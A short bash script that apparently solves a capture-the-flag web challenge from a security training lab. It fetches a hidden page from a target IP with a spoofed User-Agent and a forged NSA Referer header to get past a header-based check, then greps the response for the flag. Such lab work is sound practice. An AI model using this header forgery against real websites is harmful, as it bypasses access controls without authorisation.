#!/bin/bash

OUTPUT_FILE=./index.html

if [ -z "${IPADDR}" ]; then
    echo "IPADDR env var is missing";
    exit 1;
fi

wget -q --user-agent='ft_bornToSec' \
     --referer 'https://www.nsa.gov/' \
     --output-document=$OUTPUT_FILE \
"http://$IPADDR/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"

cat $OUTPUT_FILE | grep flag